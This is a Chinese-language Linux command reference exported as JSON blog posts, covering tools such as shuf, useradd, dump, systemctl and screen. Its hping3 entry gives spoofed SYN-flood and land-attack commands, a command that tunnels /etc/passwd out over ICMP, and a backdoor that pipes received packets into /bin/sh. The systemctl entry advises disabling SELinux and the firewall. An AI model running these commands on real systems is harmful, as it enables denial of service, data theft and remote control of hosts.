--random-source=FILE 将FILE中内容作为随机数据源。 -r, --repeat 输出行可以重复。 -z, --zero-terminated 行终止符为NUL（空字符）而不是默认的换行符。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 FILE（可选）：要处理的文件，可以为任意数量。 ARG（可选）：作为输入行的字符串，可以为任意数量。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 # 模拟硬币抛掷，获取前10个结果： [user2@pc ~]$ head -r -n 10 -e &quot;正面&quot; -e &quot;反面&quot; 反面 正面 正面 正面 反面 反面 反面 正面 正面 正面 # 体彩超级大乐透： [user2@pc ~]$ shuf -i 1-35 -n 5|sort -n &amp;&amp; shuf -i 1-12 -n 2|sort -n 4 17 20 29 31 6 11 注意 该命令是 GNU coreutils 包中的命令，更多详细的帮助信息请查看man -s 1 shuf，info coreutils 'shuf invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"shuf","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/shuf/","stats":{"text":"2 min read","time":88000,"words":359,"minutes":2},"date":"2022-02-02 05:05:16","dateFormat":"2022-02-02"},{"content":"用字符串替换的方式批量改变文件名。 补充说明 rename 命令用字符串替换的方式批量改变文件名。 语法 rename (参数) 参数 原字符串：将文件名需要替换的字符串； 目标字符串：将文件名中含有的原字符替换成目标字符串； 文件：指定要改变文件名的文件列表。 实例 将 main1.c 重命名为 main.c rename main1.c main.c main1.c rename 支持通配符 ? 可替代单个字符 * 可替代多个字符 [charset] 可替代charset集中的任意单个字符 文件夹中有这些文件 foo1, ..., foo9, foo10, ..., foo278 如果使用rename foo foo0 foo?，会把 foo1 到 foo9 的文件重命名为 foo01 到 foo09，重命名的文件只是有 4 个字符长度名称的文件，文件名中的 foo 被替换为 foo0。 如果使用rename foo foo0 foo??，foo01 到 foo99 的所有文件都被重命名为 foo001 到 foo099，只重命名 5 个字符长度名称的文件，文件名中的 foo 被替换为 foo0。 如果使用rename foo foo0 foo*，foo001 到 foo278 的所有文件都被重命名为 foo0001 到 foo0278，所有以 foo 开头的文件都被重命名。 如果使用rename foo0 foo foo0[2]*，从 foo0200 到 foo0278 的所有文件都被重命名为 foo200 到 foo278，文件名中的 foo0 被替换为 foo。 rename 支持正则表达式 字母的替换 rename &quot;s/AA/aa/&quot; * # 把文件名中的 AA 替换成 aa 修改文件的后缀 rename &quot;s//.html//.php/&quot; * # 把.html 后缀的改成 .php 后缀 批量添加文件后缀 rename &quot;s/$//.txt/&quot; * # 把所有的文件名都以 txt 结尾 批量删除文件名 rename &quot;s//.txt//&quot; * # 把所有以.txt 结尾的文件名的.txt 删掉 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rename","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rename/","stats":{"text":"2 min read","time":106000,"words":453,"minutes":2},"date":"2022-02-02 05:04:36","dateFormat":"2022-02-02"},{"content":"用来验证系统认证文件内容和格式的完整性。 补充说明 pwck 命令用来验证系统认证文件/etc/passwd和/etc/shadow的内容和格式的完整性。 语法 pwck (选项) (参数) 选项 -q：仅报告错误信息； -s：以用户 id 排序文件“/etc/passwd”和“/etc/shadow”;-r：只读方式运行指令。 参数 密码文件：指定密码文件的路径； 影子文件：指定影子文件的路径。 实例 pwck /etc/passwd user 'lp': directory '/var/spool/lpd' does not exist user 'news': directory '/var/spool/news' does not exist user 'uucp': directory '/var/spool/uucp' does not exist user 'www-data': directory '/var/www' does not exist user 'list': directory '/var/list' does not exist user 'irc': directory '/var/run/ircd' does not exist user 'gnats': directory '/var/lib/gnats' does not exist user 'nobody': directory '/nonexistent' does not exist user 'syslog': directory '/home/syslog' does not exist user 'couchdb': directory '/var/lib/couchdb' does not exist user 'speech-dispatcher': directory '/var/run/speech-dispatcher' does not exist user 'usbmux': directory '/home/usbmux' does not exist user 'haldaemon': directory '/var/run/hald' does not exist user 'pulse': directory '/var/run/pulse' does not exist user 'saned': directory '/home/saned' does not exist user 'hplip': directory '/var/run/hplip' does not exist pwck：无改变 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pwck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pwck/","stats":{"text":"2 min read","time":81000,"words":268,"minutes":2},"date":"2022-02-02 05:04:19","dateFormat":"2022-02-02"},{"content":"创建的新的系统用户。 补充说明 useradd 命令用于 Linux 中创建的新的系统用户。useradd 可用来建立用户帐号。帐号建好之后，再用 passwd 设定帐号的密码．而可用 userdel 删除帐号。使用 useradd 指令所建立的帐号，实际上是保存在/etc/passwd文本文件中。 在 Slackware 中，adduser 指令是个 script 程序，利用交谈的方式取得输入的用户帐号资料，然后再交由真正建立帐号的 useradd 命令建立新用户，如此可方便管理员建立用户帐号。在 Red Hat Linux 中， adduser 命令 则是 useradd 命令的符号连接，两者实际上是同一个指令。 语法 useradd (选项) (参数) 选项 -c&lt;备注&gt;：加上备注文字。备注文字会保存在 passwd 的备注栏位中； -d&lt;登入目录&gt;：指定用户登入时的启始目录； -D：变更预设值； -e&lt;有效期限&gt;：指定帐号的有效期限； -f&lt;缓冲天数&gt;：指定在密码过期后多少天即关闭该帐号； -g&lt;群组&gt;：指定用户所属的群组； -G&lt;群组&gt;：指定用户所属的附加群组； -m：自动建立用户的登入目录； -M：不要自动建立用户的登入目录； -n：取消建立以用户名称为名的群组； -r：建立系统帐号； -s&lt;shell&gt;：指定用户登入后所使用的 shell； -u&lt;uid&gt;：指定用户 id。 参数 用户名：要创建的用户名。 实例 新建用户加入组： useradd –g sales jack –G company,employees //-g：加入主要组、-G：加入次要组 建立一个新用户账户，并设置 ID： useradd caojh -u 544 需要说明的是，设定 ID 值时尽量要大于 500，以免冲突。因为 Linux 安装后会建立一些特殊用户，一般 0 到 499 之间的值留给 bin、mail 这样的系统账号。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"useradd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/useradd/","stats":{"text":"2 min read","time":111000,"words":496,"minutes":2},"date":"2022-02-02 05:04:00","dateFormat":"2022-02-02"},{"content":"以指定增量从首数开始打印数字到尾数。 补充说明 seq 命令用于产生从某个数到另外一个数之间的所有整数。 语法 seq [选项]... 尾数 seq [选项]... 首数 尾数 seq [选项]... 首数 增量 尾数 选项 -f, --format=格式 使用printf 样式的浮点格式 -s, --separator=字符串 使用指定字符串分隔数字（默认使用：\\n） -w, --equal-width 在列前添加0 使得宽度相同 实例 -f 选项：指定格式 #seq -f&quot;%3g&quot; 9 11 9 10 11 %后面指定数字的位数 默认是%g，%3g那么数字位数不足部分是空格。 #sed -f&quot;%03g&quot; 9 11 #seq -f&quot;str%03g&quot; 9 11 str009 str010 str011 这样的话数字位数不足部分是 0，%前面制定字符串。 -w 选项：指定输出数字同宽 seq -w 98 101 098 099 100 101 不能和-f一起用，输出是同宽的。 -s 选项：指定分隔符（默认是回车） seq -s&quot; &quot; -f&quot;str%03g&quot; 9 11 str009 str010 str011 要指定/t做为分隔符号： seq -s&quot;`echo -e &quot;/t&quot;`&quot; 9 11 指定\\n作为分隔符号： seq -s&quot;`echo -e &quot;\\n&quot;`&quot; 9 11 19293949596979899910911 得到的是个错误结果，不过一般也没有这个必要，它默认的就是回车作为分隔符。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"seq","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/seq/","stats":{"text":"2 min read","time":84000,"words":339,"minutes":2},"date":"2022-02-02 05:02:31","dateFormat":"2022-02-02"},{"content":"用于备份 ext2 或者 ext3 文件系统。 补充说明 dump 命令用于备份 ext2 或者 ext3 文件系统。可将目录或整个文件系统备份至指定的设备，或备份成一个大文件。 语法 dump (选项) (参数) 选项 -0123456789：备份的层级； -b&lt;区块大小&gt;：指定区块的大小，单位为 KB； -B&lt;区块数目&gt;：指定备份卷册的区块数目； -c：修改备份磁带预设的密度与容量； -d&lt;密度&gt;：设置磁带的密度。单位为 BPI； -f&lt;设备名称&gt;：指定备份设备； -h&lt;层级&gt;：当备份层级等于或大于指定的层级时，将不备份用户标示为“nodump”的文件； -n：当备份工作需要管理员介入时，向所有“operator”群组中的使用者发出通知； -s&lt;磁带长度&gt;：备份磁带的长度，单位为英尺； -T&lt;日期&gt;：指定备份的时间与日期； -u：备份完毕后，在/etc/dumpdates 中记录备份的文件系统、层级、日期与时间等； -w：与-W 类似，但仅显示需要备份的文件； -W：显示需要备份的文件及其最后一次备份的层级、时间与日期。 参数 备份源：指定要备份的文件、目录或者文件系统。 实例 将/home目录所有内容备份到/tmp/homeback.bak文件中，备份层级为0并在/etc/dumpdates中记录相关信息： ‍dump -0u -f /tmp/homeback.bak /home 将/home目录所有内容备份到/tmp/homeback.bak文件中，备份层级为1（只备份上次使用层次0备份后发生过改变的数据）并在/etc/dumpdates中记录相关信息： dump -1u -f /tmp/homeback.bak /home 通过 dump 命令的备份层级，可实现完整+增量备份、完整+差异备份，在配合 crontab 可以实现无人值守备份。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dump","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dump/","stats":{"text":"2 min read","time":109000,"words":485,"minutes":2},"date":"2022-02-02 05:02:16","dateFormat":"2022-02-02"},{"content":"功能强大全屏幕的文本编辑器。 补充说明 pico 命令是功能强大全屏幕的文本编辑器。pico 的操作简单，提供了丰富的快捷键。常用的快捷键如下： Ctrl+G：获得 pico 的帮助信息； Ctrl+O：保存文件内容，如果是新文件，需要输入文件名； Ctrl+R：在当前光标位置插入一个指定的文本文件内容； Ctrl+Y：向前翻页； Ctrl+V：向后翻页； Ctrl+w：对文件进行搜索； Ctrl+K：剪切当前文件行到粘贴缓冲区； Ctrl+U：粘贴缓冲区中的内容到当前光标所在位置； Ctrl+C：显示当前光标位置； Ctrl+T：调用拼写检查功能，对文档进行拼写检查； Ctrl+J：段落重排； Ctrl+X：退出，当文件内容发生改变时，提供是否保存修改。 语法 pico (选项) (参数) 选项 -b：开启置换的功能； -d：开启删除的功能； -e：使用完整的文件名称； -f：支持键盘上 F1、F2...功能键； -g：显示光标； -h：在线帮助； -j：开启切换的功能； -k：预设 pico 在使用剪下命令时，会把光标所在的列的内容全部删除； -m：开启鼠标支持的功能，您可用鼠标点选命令列表； -n&lt;间隔秒数&gt;：设置多久检查一次新邮件； -o&lt;工作目录&gt;：设置工作目录； -q：忽略预设值； -r&lt;编辑页宽&gt;：设置编辑文件的页宽； -s&lt;拼字检查器&gt;：另外指定拼字检查器； -t：启动工具模式； -v：启动阅读模式，用户只能观看，无法编辑文件的内容； -w：关闭自动换行，通过这个参数可以编辑内容很长的列； -x：关闭页面下方的命令列表； -z：让 pico 可被 Ctrl+z 中断，暂存在后台作业里； +&lt;列表编号&gt;：执行 pico 指令进入编辑模式时，从指定的列数开始编辑。 参数 文件：指定要编辑的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pico","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pico/","stats":{"text":"2 min read","time":116000,"words":526,"minutes":2},"date":"2022-02-02 05:01:35","dateFormat":"2022-02-02"},{"content":"分割任意大小的文件。 补充说明 split 命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。 选项 -b：值为每一输出档案的大小，单位为 byte。 -C：每一输出档中，单行的最大 byte 数。 -d：使用数字作为后缀。 -l：值为每一输出档的行数大小。 -a：指定后缀长度(默认为2)。 实例 生成一个大小为 100KB 的测试文件： [root@localhost split]# dd if=/dev/zero bs=100k count=1 of=date.file 1+0 records in 1+0 records out 102400 bytes (102 kB) copied, 0.00043 seconds, 238 MB/s 使用 split 命令将上面创建的 date.file 文件分割成大小为 10KB 的小文件： [root@localhost split]# split -b 10k date.file [root@localhost split]# ls date.file xaa xab xac xad xae xaf xag xah xai xaj 文件被分割成多个带有字母的后缀文件，如果想用数字后缀可使用-d 参数，同时可以使用-a length 来指定后缀的长度： [root@localhost split]# split -b 10k date.file -d -a 3 [root@localhost split]# ls date.file x000 x001 x002 x003 x004 x005 x006 x007 x008 x009 为分割后的文件指定文件名的前缀： [root@localhost split]# split -b 10k date.file -d -a 3 split_file [root@localhost split]# ls date.file split_file000 split_file001 split_file002 split_file003 split_file004 split_file005 split_file006 split_file007 split_file008 split_file009 使用 -l 选项根据文件的行数来分割文件，例如把文件分割成每个包含 10 行的小文件： split -l 10 date.file ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"split","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/split/","stats":{"text":"2 min read","time":99000,"words":381,"minutes":2},"date":"2022-02-02 05:00:23","dateFormat":"2022-02-02"},{"content":"系统服务管理器指令。 补充说明 systemctl 命令是系统服务管理器指令，它实际上将 service 和 chkconfig 这两个命令组合到一起。 任务 旧指令 新指令 使某服务自动启动 chkconfig --level 3 httpd on systemctl enable httpd.service 使某服务不自动启动 chkconfig --level 3 httpd off systemctl disable httpd.service 检查服务状态 service httpd status systemctl status httpd.service （服务详细信息） systemctl is-active httpd.service （仅显示是否 Active) 显示所有已启动的服务 chkconfig --list systemctl list-units --type=service 启动某服务 service httpd start systemctl start httpd.service 停止某服务 service httpd stop systemctl stop httpd.service 重启某服务 service httpd restart systemctl restart httpd.service 实例 systemctl start nfs-server.service . # 启动nfs服务 systemctl enable nfs-server.service # 设置开机自启动 systemctl disable nfs-server.service # 停止开机自启动 systemctl status nfs-server.service # 查看服务当前状态 systemctl restart nfs-server.service # 重新启动某服务 systemctl list-units --type=service # 查看所有已启动的服务 开启防火墙 22 端口 iptables -I INPUT -p tcp --dport 22 -j accept 如果仍然有问题，就可能是 SELinux 导致的 关闭 SElinux： 修改/etc/selinux/config文件中的SELINUX=&quot;&quot;为 disabled，然后重启。 彻底关闭防火墙： sudo systemctl status firewalld.service sudo systemctl stop firewalld.service sudo systemctl disable firewalld.service ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"systemctl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/systemctl/","stats":{"text":"2 min read","time":86000,"words":320,"minutes":2},"date":"2022-02-02 04:59:17","dateFormat":"2022-02-02"},{"content":"用于显示文件的状态信息。 补充说明 stat 命令用于显示文件的状态信息。stat 命令的输出信息比 ls 命令的输出信息要更详细。 语法 stat (选项) (参数) 选项 -L：支持符号连接； -f：显示文件系统状态而非文件状态； -t：以简洁方式输出信息； --help：显示指令的帮助信息； --version：显示指令的版本信息。 参数 文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。 实例 [root@localhost ~]# ls -l myfile -rw-r--r-- 1 root root 0 2010-10-09 myfile [root@localhost ~]# stat myfile file: “myfile” Size: 0 Blocks: 8 IO Block: 4096 一般空文件 Device: fd00h/64768d Inode: 194805815 Links: 1 Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2010-12-12 12:22:35.000000000 +0800 Modify: 2010-10-09 20:44:21.000000000 +0800 Change: 2010-10-09 20:44:21.000000000 +0800 [root@localhost ~]# stat -f myfile File: &quot;myfile&quot; id: 0 Namelen: 255 type: ext2/ext3 Block size: 4096 Fundamental block size: 4096 Blocks: Total: 241555461 free: 232910771 Available: 220442547 Inodes: Total: 249364480 Free: 249139691 [root@localhost ~]# stat -t myfile myfile 0 8 81a4 0 0 fd00 194805815 1 0 0 1292127755 1286628261 1286628261 4096 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"stat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/stat/","stats":{"text":"2 min read","time":79000,"words":277,"minutes":2},"date":"2022-02-02 04:58:47","dateFormat":"2022-02-02"},{"content":"退出当前的 shell。。 概要 exit [n] 主要用途 执行 exit 可使 shell 以指定的状态值退出。若不设置参数，则以最后一条命令的返回值作为 exit 的返回值退出。 参数 n（可选）：指定的 shell 返回值（整数）。 返回值 返回值为你指定的参数 n 的值，如果你指定的参数大于 255 或小于 0，那么会通过加或减 256 的方式使得返回值总是处于 0 到 255 之间。 例子 退出当前 shell： [root@localhost ~]# exit logout 也可以使用ctrl+d退出当前终端，下面列出了打开或关闭该功能的方法： # 打开ctrl+d退出终端 set -o ignoreeof # 关闭ctrl+d退出终端 set +o ignoreeof 在脚本中，进入脚本所在目录，否则退出： cd $(dirname $0) || exit 1 在脚本中，判断参数数量，不匹配就打印使用方式，退出： if [ &quot;$#&quot; -ne &quot;2&quot; ]; then echo &quot;usage: $0 &lt;area&gt; &lt;hours&gt;&quot; exit 2 fi 在脚本中，退出时删除临时文件： trap &quot;rm -f tmpfile; echo Bye.&quot; EXIT 检查上一命令的退出码： ./mycommand.sh EXCODE=$? if [ &quot;$EXCODE&quot; == &quot;0&quot; ]; then echo &quot;O.K&quot; fi 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"exit","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/exit/","stats":{"text":"2 min read","time":80000,"words":327,"minutes":2},"date":"2022-02-02 04:57:45","dateFormat":"2022-02-02"},{"content":"测试网络及主机的安全。 补充说明 hping 是用于生成和解析 TCPIP 协议数据包的开源工具。创作者是 Salvatore Sanfilippo。目前最新版是 hping3，支持使用 tcl 脚本自动化地调用其 API。hping 是安全审计、防火墙测试等工作的标配工具。hping 优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。 安装 yum install libpcap-devel tc-devel ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h wget http://www.hping.org/hping3-20051105.tar.gz tar zxvf hping3-20051105.tar.gz cd hping3-20051105 ./configure make make install 选项 -H --help 显示帮助。 -v -VERSION 版本信息。 -c --count count 发送数据包的次数 关于 countreached_timeout 可以在 hping2.h 里编辑。 -i --interval 包发送间隔时间（单位是毫秒）缺省时间是 1 秒,此功能在增加传输率上很重要,在 idle/spoofing 扫描时此功能也会被用到,你可以参考 hping-howto 获得更多信息-fast 每秒发 10 个数据包。 -n -nmeric 数字输出，象征性输出主机地址。 -q -quiet 退出。 -I --interface interface name 无非就是 eth0 之类的参数。 -v --verbose 显示很多信息，TCP 回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0 -D --debug 进入 debug 模式当你遇到麻烦时，比如用 HPING 遇到一些不合你习惯的时候，你可以用此模式修改 HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......） -z --bind 快捷键的使用。 -Z --unbind 消除快捷键。 -O --rawip RAWIP 模式，在此模式下 HPING 会发送带数据的 IP 头。 -1 --icmp ICMP 模式，此模式下 HPING 会发送 IGMP 应答报，你可以用--ICMPTYPE --ICMPCODE 选项发送其他类型/模式的 ICMP 报文。 -2 --udp UDP 模式，缺省下，HPING 会发送 UDP 报文到主机的 0 端口，你可以用--baseport --destport --keep 选项指定其模式。 -9 --listen signatuer hping 的 listen 模式，用此模式，HPING 会接收指定的数据。 -a --spoof hostname 伪造 IP 攻击，防火墙就不会记录你的真实 IP 了，当然回应的包你也接收不到了。 -t --ttl time to live 可以指定发出包的 TTL 值。 -H --ipproto 在 RAW IP 模式里选择 IP 协议。 -w --WINID UNIX ,WINDIWS 的 id 回应不同的，这选项可以让你的 ID 回应和 WINDOWS 一样。 -r --rel 更改 ID 的，可以让 ID 曾递减输出，详见 HPING-HOWTO。 -F --FRAG 更改包的 FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是 16 字节。 -x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。 -y -dontfrag 发送不可恢复的 IP 碎片，这可以让你了解更多的 MTU PATH DISCOVERY。 -G --fragoff fragment offset value set the fragment offset -m --mtu mtu value 用此项后 ID 数值变得很大，50000 没指定此项时 3000-20000 左右。 -G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过 9 个路由，即使主机屏蔽了 ICMP 报文。 -C --ICMPTYPE type 指定 ICMP 类型，缺省是 ICMP echo REQUEST。 -K --ICMPCODE CODE 指定 ICMP 代号，缺省 0。 --icmp-ipver 把 IP 版本也插入 IP 头。 --icmp-iphlen 设置 IP 头的长度，缺省为 5（32 字节）。 --icmp-iplen 设置 IP 包长度。 --icmp-ipid 设置 ICMP 报文 IP 头的 ID，缺省是 RANDOM。 --icmp-ipproto 设置协议的，缺省是 TCP。 -icmp-cksum 设置校验和。 -icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests) --icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests) -s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加 1，这规则你可以自己定义。 -p --deskport [+][+]desk port 设置目标端口，缺省为 0，一个加号设置为:每发送一个请求包到达后，端口加 1，两个加号为：每发一个包，端口数加 1。 --keep 上面说过了。 -w --win 发的大小和 windows 一样大，64BYTE。 -O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4. -m --tcpseq 设置 TCP 序列数。 -l --tcpck 设置 TCP ack。 -Q --seqnum 搜集序列号的，这对于你分析 TCP 序列号有很大作用。 Hping3 功能 Hping3 主要有以下典型功能应用： # 防火墙测试 使用 Hping3 指定各种数据包字段，依次对防火墙进行详细测试。 测试防火墙对 ICMP 包的反应、是否支持 traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以 LandAttack 方式测试目标防火墙（Land Attack 是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。 hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10 # 端口扫描 Hping3 也可以对目标端口进行扫描。Hping3 支持指定 TCP 各个标志位、长度等信息。以下示例可用于探测目标机的 80 端口是否开放： hping3 -I eth0 -S 192.168.10.1 -p 80 其中-I eth0指定使用 eth0 端口，-S指定 TCP 包的标志位 SYN，-p 80指定探测的目的端口。 hping3 支持非常丰富的端口探测方式，nmap 拥有的扫描方式 hping3 几乎都支持（除开 connect 方式，因为 Hping3 仅发送与接收包，不会维护连接，所以不支持 connect 方式探测）。而且 Hping3 能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3 的端口扫描性能及综合处理能力，无法与 Nmap 相比。一般使用它仅对少量主机的少量端口进行扫描。 # Idle 扫描 Idle 扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有 Hping3 的作者 Salvatore Sanfilippo 发明的，目前 Idle 扫描在 Nmap 中也有实现。 该扫描原理是：寻找一台 idle 主机（该主机没有任何的网络流量，并且 IPID 是逐个增长的），攻击端主机先向 idle 主机发送探测包，从回复包中获取其 IPID。冒充 idle 主机的 IP 地址向远程主机的端口发送 SYN 包（此处假设为 SYN 包），此时如果远程主机的目的端口开放，那么会回复 SYN/ACK，此时 idle 主机收到 SYN/ACK 后回复 RST 包。然后攻击端主机再向 idle 主机发送探测包，获取其 IPID。那么对比两次的 IPID 值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。 # 拒绝服务攻击 使用 Hping3 可以很方便构建拒绝服务攻击。比如对目标机发起大量 SYN 连接，伪造源地址为 192.168.10.99，并使用 1000 微秒的间隔发送各个 SYN 包。 hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000 其他攻击如 smurf、teardrop、land attack 等也很容易构建出来。 # 文件传输 Hping3 支持通过 TCP/UDP/ICMP 等包来进行文件传输。相当于借助 TCP/UDP/ICMP 包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务： hping3 192.168.1.159--listen signature --safe --icmp 监听 ICMP 包中的签名，根据签名解析出文件内容。 在发送端使用签名打包的 ICMP 包发送文件： hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd 将/etc/passwd密码文件通过 ICMP 包传给 192.168.10.44 主机。发送包大小为 100 字节（-d 100），发送签名为 signature(-sign signature)。 # 木马功能 如果 Hping3 能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开 shell 通信。与 netcat 的后门功能类似。 示例：本地打开 53 号 UDP 端口（DNS 解析服务）监听来自 192.168.10.66 主机的包含签名为 signature 的数据包，并将收到的数据调用/bin/sh 执行。 在木马启动端： hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh 在远程控制端： echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd 将包含 ls 命令的文件加上签名 signature 发送到 192.168.10.44 主机的 53 号 UDP 端口，包数据长度为 100 字节。 当然这里只是简单的演示程序，真实的场景，控制端可以利益 shell 执行很多的高级复杂的操作。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hping3","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hping3/","stats":{"text":"9 min read","time":526000,"words":2171,"minutes":9},"date":"2022-02-02 04:03:46","dateFormat":"2022-02-02"},{"content":"用于命令行终端切换。 补充说明 Screen 是一款由 GNU 计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen 可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。 会话恢复 只要 Screen 本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行 screen -r 就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令 detach，在保证里面的程序正常运行的情况下让 Screen 挂起（切换到后台）。这一点和图形界面下的 VNC 很相似。 多窗口 在 Screen 环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen 实现了基本的文本操作，如复制粘贴等； 还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享 Screen 可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。 语法 # screen -AmRvx -[ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;] 选项 -A 将所有的视窗都调整为目前终端机的大小。 -d &lt;作业名称&gt; 将指定的 screen 作业离线。 -h &lt;行数&gt; 指定视窗的缓冲区行数。 -m 即使目前已在作业中的 screen 作业，仍强制建立新的 screen 作业。 -r &lt;作业名称&gt; 恢复离线的 screen 作业。 -R 先试图恢复离线的作业。若找不到离线的作业，即建立新的 screen 作业。 -s 指定建立新视窗时，所要执行的 shell。 -S &lt;作业名称&gt; 指定 screen 作业的名称。 -v 显示版本信息。 -x 恢复之前离线的 screen 作业。 -ls 或--list 显示目前所有的 screen 作业。 -wipe 检查目前所有的 screen 作业，并删除已经无法使用的 screen 作业。 常用 screen 参数 screen -S yourname -&gt; 新建一个叫 yourname 的 session screen -ls -&gt; 列出当前所有的 session screen -r yourname -&gt; 回到 yourname 这个 session screen -d yourname -&gt; 远程 detach 某个 session screen -d -r yourname -&gt; 结束当前 session 并回到 yourname 这个 session 在每个 screen session 下，所有命令都以 ctrl+a(C-a) 开始。 C-a ? -&gt; 显示所有键绑定信息 C-a c -&gt; 创建一个新的运行 shell 的窗口并切换到该窗口 C-a n -&gt; Next，切换到下一个 window C-a p -&gt; Previous，切换到前一个 window C-a 0..9 -&gt; 切换到第 0..9 个 window Ctrl+a [Space] -&gt; 由视窗 0 循序切换到视窗 9 C-a C-a -&gt; 在两个最近使用的 window 间切换 C-a x -&gt; 锁住当前的 window，需用用户密码解锁 C-a d -&gt; detach，暂时离开当前 session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台) 都在继续执行，即使 logout 也不影响。 C-a z -&gt; 把当前 session 放到后台执行，用 shell 的 fg 命令则可回去。 C-a w -&gt; 显示所有窗口列表 C-a t -&gt; time，显示当前时间，和系统的 load C-a k -&gt; kill window，强行关闭当前的 window C-a -&gt; 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 [vi 一样 C-b Backward，PageUp C-f Forward，PageDown H(大写) High，将光标移至左上角 L Low，将光标移至左下角 0 移到行首 $ 行末 w forward one word，以字为单位往前移 b backward one word，以字为单位往后移 Space 第一次按为标记区起点，第二次按为终点 Esc 结束 copy mode C-a ] -&gt; paste，把刚刚在 copy mode 选定的内容贴上 使用 screen 安装 screen 流行的 Linux 发行版（例如 Red Hat Enterprise Linux）通常会自带 screen 实用程序，如果没有的话，可以从 GNU screen 的官方网站下载。 